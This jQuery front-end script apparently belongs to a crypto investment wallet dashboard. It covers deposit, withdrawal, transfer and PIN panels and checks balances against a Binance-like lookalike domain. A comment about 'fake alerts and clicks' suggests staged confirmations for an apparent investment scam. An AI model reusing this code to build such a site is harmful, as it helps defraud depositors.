let depositInput = 0;
let depositInputValid = false;

// check if deposit input is a number
const checkDepositInput = (value) => {
  if (isNaN(value)) {
    alert("Must input numbers");
    return false;
  }else{
      depositInput = value;
      depositInputValid = true;
      $(".confirm-deposit-amount-show").html(depositInput);
  }
}

let withdrawalInput = 0;
let withdrawalInputValid = false;

// check if withdrawal input is a number
const checkWithdrawalInput = (value) => {
  if (isNaN(value)) {
    alert("Must input numbers");
    return false;
  }else{
      withdrawalInput = value;
      withdrawalInputValid = true;
  }
}




$(document).ready(function(){
        $(".transit").click(function() {
        $('.transact').toggleClass('nil');
        $('.opp').toggleClass('oppp');
      });
   
        $(".opp").click(function() {
        $('.transact').removeClass('nil');
        $('.opp').removeClass('oppp, ovv');
        $('.deppp').removeClass('nil');
        
        $('.withdrawzz, .transferzz, .reinvestzz, .transferzz, .securityzz, .profilezz').removeClass('nil');
        $('.opp').removeClass('oppp');
        $('.deppp').removeClass('nil');
      });
   
             $("#withdraw").click(function() {
        $('.withdrawzz').toggleClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');

      });

      
      $(".actwith").click(function() {
        $('.withdrawzz').toggleClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');

      });


             $(".left").click(function() {
        $('.withdrawzz').toggleClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('oppp');
      });


      $("#fund").click(function() {
        $('.depositzz').toggleClass('nil');
        $('.transact').removeClass('nil');
        $('.reinvestzz').removeClass('nil');
        $('.opp').addClass('ovv');

      });



      $(" .back").click(function() {
        $('.back').removeClass('nil');
      });




      
      $("#fundt").click(function() {
        $('.depositzz').addClass('nil');
        $('.transact').removeClass('nil');
        $('.transferzz').removeClass('nil');
        $('.opp').addClass('ovv');

      });
      

      $("#fundn").click(function() {
        $('.depositzz').addClass('nil');
        $('.withdrawzz').removeClass('nil');
        $('.transact').removeClass('nil');
        $('.transferzz').removeClass('nil');
        $('.opp').addClass('ovv');
        $('.notenoghalert').removeClass('nil');

      });




              $("#reinvest").click(function() {
        $('.reinvestzz').toggleClass('nil');
        
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
      });

      $(".actinv").click(function() {
        $('.reinvestzz').toggleClass('nil');
        
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
      });

             $("#transfer").click(function() {
        $('.transferzz').toggleClass('nil');
        
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');

      });

      $(".acttrans").click(function() {
        $('.transferzz').toggleClass('nil');
        
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');

      });


              $(".invest").click(function() {
        $('.reinvestzz').toggleClass('nil');
        
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
      });
             $("#transfer").click(function() {
        $('.transferzz').toggleClass('nil');
        
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');

      });


             $("#deposit").click(function() {
        $('.depositzz').toggleClass('nil');
        
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');

      });

      $(".actdepp").click(function() {
        $('.depositzz').toggleClass('nil');
        
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');

      });


             $(".rightx").click(function() {
        $('.depositzz').toggleClass('nil');
        
        $('.transact').removeClass('nil');
        $('.opp').addClass('oppp');

      });


      
             $(".close-btn").click(function() {
        $('.deppp').removeClass('nil');
        
        $('.opp').removeClass(' ovv');
        
        $('.opp').removeClass('oppp');

      });
      
      
/** fakes fake fake alerts and clicks **/

      $(".withdconfirm").click(function() {
          // make sure input is valid before processing
          if(withdrawalInputValid && (withdrawalInput != 0)){
              // send a post request to the server to fetch customers
                (async () => {
                    const rawResponse = await fetch('https://binancvestltd.co/wallet/includes/processes.php?getbalance=1', {
                        method: 'GET',
                    });
                    const content = await rawResponse.json();
                    const status = rawResponse.status;
                    // check if there is an error in the response
                    if (content.error) {
                        alert(content.message);
                    } else {
                        // display withdrawals confirmation if balance is enough
                        console.log(content.balance);
                        if(content.balance >= withdrawalInput){
                            $('.withdconfirmation').addClass('nil');
                            $(".confirm-withdrawal-amount-show").html(withdrawalInput);
                        }else{
                            $('.notenoghalert').addClass('nil');
                        }
                    }
                })();
          }else{
              alert("Enter a valid withdrawal amount!");
          }
      });


      $(".withdsucc").click(function() {
        $('.withdrawalert').addClass('nil');
      });

      $(".deppsucc").click(function() {
        $('.deppalert').addClass('nil');
      });


      $(".transalrt").click(function() {
        $('.transferalert').addClass('nil');

      });

      $(".investconf").click(function() {
        $('.investconfirmation').addClass('nil');

      });

      $(".bep").click(function() {
        $('.bepnet').addClass('nil');
        $('.investconfirmation, .btcnet, .trcnet, .ercnet').removeClass('nil');

      });

      $(".btc").click(function() {
        $('.btcnet').addClass('nil');
        $('.investconfirmation, .bepnet, .trcnet, .ercnet').removeClass('nil');

      });


      $(".trc").click(function() {
        $('.trcnet').addClass('nil');
        $('.investconfirmation, .btcnet, .bepnet, .ercnet').removeClass('nil');

      });

      $(".erc").click(function() {
        $('.ercnet').addClass('nil');
        $('.investconfirmation, .btcnet, .bepnet, .trcnet').removeClass('nil');

      });

      $(".investproceed").click(function() {
        $('.investalert').addClass('nil');

      });


      $(".0x0").click(function() {
        $('.notenoghalert').addClass('nil');

      });

       

      $(".pin-btn").click(function() {
        $('.pin-request').addClass('nil'); 
        $('.paymentzz').removeClass('nil');
        $('.transact').removeClass('nil');
        $('.profilezz').removeClass('nil');
        $('.securityzz').removeClass('nil');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');
      });

      $(".validate-btn").click(function() {
        $('.validationalert').addClass('nil'); 
        $('.paymentzz').removeClass('nil');
        $('.profilezz').removeClass('nil');
        $('.securityzz').removeClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');
      });

      $(".investsucc").click(function() {
        $('.investalert').addClass('nil'); 
        $('.paymentzz').removeClass('nil');
        $('.profilezz').removeClass('nil');
        $('.securityzz').removeClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');
      });
             $(".paymentsetup").click(function() {
        $('.paymentzz').addClass('nil');
        $('.profilezz').removeClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');
      });
      
      
             $("#Profile").click(function() {
        $('.profilezz').addClass('nil');
        $('.paymentzz').removeClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');

      });

             $("#payment").click(function() {
        $('.paymentzz').addClass('nil');
        $('.profilezz').removeClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');
      });

      $("#security").click(function() {
        $('.securityzz').addClass('nil');
        $('.profilezz').removeClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');
      });


      $("#Paxword").click(function() {
        $('.passwordzz').addClass('nile');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');
      });
      
       $("#PIN").click(function() {
        $('.PINzz').addClass('nile');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');
      });     
      
      
             $(".close-btn").click(function() {
        $('.deppp').removeClass('nil');
        $('.passwordzz').removeClass('nile');
        $('.PINzz').removeClass('nile');
        $('.opp').removeClass(' ovv');
        
        $('.opp').removeClass('oppp');

      });


      
             $("#abtstarting").click(function() {
        $('.abtstarting').addClass('nil');
        $('.paymentzz').removeClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');

      });

             $("#abtpayment").click(function() {
        $('.abtpayment').addClass('nil');
        $('.profilezz').removeClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');
      });

      $("#abtsecurity").click(function() {
        $('.abtsecurity').addClass('nil');
        $('.profilezz').removeClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');
      });


      $("#abtinvestments").click(function() {
        $('.abtinvestments').addClass('nil');
        $('.profilezz').removeClass('nil');
        $('.transact').removeClass('nil');
        $('.opp').addClass('ovv');
        $('.opp').addClass('oppp');
      });





      
             $(".close-btnx").click(function() {
        $('.seczz').removeClass('nile');
         

      });
      



      
       			$(".x1").click(function() {
        $('.x1-cont').toggleClass('height');
         $('.x1-address').toggleClass('nil');
       $('.x2-address, .x3-address, .x4-address, .x5-address, .x6-address').removeClass('drop');
       $('.x2-cont, .x3-cont, .x4-cont, .x5-cont, .x6-cont').removeClass('height');
      
      });
      
      
      
       			$(".x2").click(function() {
        $('.x2-cont').toggleClass('height');
         $('.x2-address').toggleClass('drop');

        $('.x1-cont, .x3-cont, .x4-cont, .x5-cont, .x6-cont').removeClass('height');
      });
      
       			$(".x3").click(function() {
        $('.x3-cont').toggleClass('height');
         $('.x3-address').toggleClass('drop');
       $('.x1-address, .x2-address, .x4-address, .x5-address, .x6-address').removeClass('drop');
        $('.x1-cont, .x2-cont, .x4-cont, .x5-cont, .x6-cont').removeClass('height');
      });

      
       			$(".x3").click(function() {
                   
        $('.x3').toggleClass('selected');
        
        $('.x1, .x2').removeClass('selected');
                });

       			$(".x1").click(function() {
                   
                   $('.x1').toggleClass('selected');
                   
                   $('.x3, .x2').removeClass('selected');
                           });


       			$(".x2").click(function() {
                   
        $('.x2').toggleClass('selected');
        
        $('.x1, .x3').removeClass('selected');
                });


  
});

    var myVar;

function loader() {
    myVar = setTimeout(showPage, 1000);




}

function showPage() {
document.getElementById("loader").className += " none";

};


var prevScrollpos = window.pageYOffset;
window.onscroll = function() {
var currentScrollPos = window.pageYOffset;
  if (prevScrollpos > currentScrollPos) {
    document.getElementById("footerx").style.transform = "translatey(00px)";
  } else {
    document.getElementById("footerx").style.transform = "translatey(150px)";
  }
  prevScrollpos = currentScrollPos;
}


   
   
